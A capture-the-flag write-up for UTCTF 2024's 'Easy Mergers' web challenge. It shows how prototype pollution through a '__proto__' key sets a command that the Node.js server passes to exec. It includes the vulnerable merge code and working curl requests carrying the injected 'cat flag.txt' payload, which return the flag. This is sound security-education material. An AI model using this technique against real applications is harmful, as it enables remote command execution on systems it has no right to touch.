# Easy Mergers v0.1 | Web | UTCTF 2024

We are given `merger.zip` and a URL `http://guppy.utctf.live:8725`. The server side code is written in JS. Reading through the source code, there is a `flag.txt` file, but the server does not give access to this file. A potential vulnerability is the use of `exec` in `merger.js` which executes shell commands. If we are able to set `secret.cmd`, then we will be able to make the server execute any command we wish, such as `cat flag.txt` to get the flag.

I was actually stuck on this challenge for a while, until I searched for "js rce". This led to an article about prototype pollution in JS (https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce). I then searched for "js prototype pollution" and learned that the commonly used `__proto__` attribute of any object can be used to effectively add attributes to all objects in a JS program. Therefore, we can set `secret.cmd` by setting `__proto__.cmd` or `__proto__["cmd"]` of any object, and lines 14-17 of `merger.js` will let us do exactly that:

```js
if (!(orig[data.attributes[k]] === undefined) && isObject(orig[data.attributes[k]]) && isObject(data.values[k])) {
    for (const key in data.values[k]) {
        orig[data.attributes[k]][key] = data.values[k][key];
    }
}
```

In the following commands, replace `<cookie>` with an actual cookie from the website.

```
$ curl -X POST guppy.utctf.live:8725/api/makeCompany \
-b "connect.sid=<cookie>" \
-H "Content-Type: application/json" \
-d '{"attributes": [], "values": []}' \
-i
HTTP/1.1 200 OK
X-Powered-By: Express
Date: Thu, 04 Apr 2024 01:00:41 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Transfer-Encoding: chunked

0
$ curl -X POST guppy.utctf.live:8725/api/absorbCompany/0 \
-b "connect.sid=<cookie>" \
-H "Content-Type: application/json" \
-d '{"attributes": ["__proto__"], "values": [{"cmd": "cat flag.txt"}]}' \
-i
HTTP/1.1 200 OK
X-Powered-By: Express
Date: Thu, 04 Apr 2024 01:04:31 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Transfer-Encoding: chunked

{"merged":{"cid":4},"err":null,"stdout":"utflag{p0lluted_b4ckdoorz_and_m0r3}","stderr":""}
```

```
utflag{p0lluted_b4ckdoorz_and_m0r3}
```

JS is a mess.